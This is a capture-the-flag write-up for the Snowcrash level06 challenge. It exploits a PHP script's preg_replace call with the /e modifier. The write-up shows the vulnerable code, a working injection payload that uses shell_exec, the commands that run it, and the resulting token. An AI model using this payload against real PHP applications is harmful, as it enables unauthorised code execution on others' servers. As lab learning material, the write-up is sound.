# Snowcrash06

This time we have a binary as well as a php file.

```php
#!/usr/bin/php
<?php
function y($key)
{   $key = preg_replace("/\./", " x ", $key);
    $key = preg_replace("/@/", " y", $key);
    print "here";
    return $key;
}
function x($y, $z)
{
    $a = file_get_contents($y);
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
    $a = preg_replace("/\[/", "(", $a);
    $a = preg_replace("/\]/", ")", $a);
    return $a;
}
    $r = x($argv[1], $argv[2]);
    print $r;
?>

```

While the code looks pretty harmless at first glance and just prints what's in the path passed by argument after doing a bunch of regex

After careful inspection we can see that there is a e flag in regex and this flag actually interprets code !

We just have to be able to reach it

It looks something like that
```sh
[x {${shell_exec(getflag)}} ]
```

```sh
level06:~$ echo '[x {${shell_exec(getflag)}} ]' > /tmp/t
level06@SnowCrash:~$ ./level06 /tmp/t
PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
```
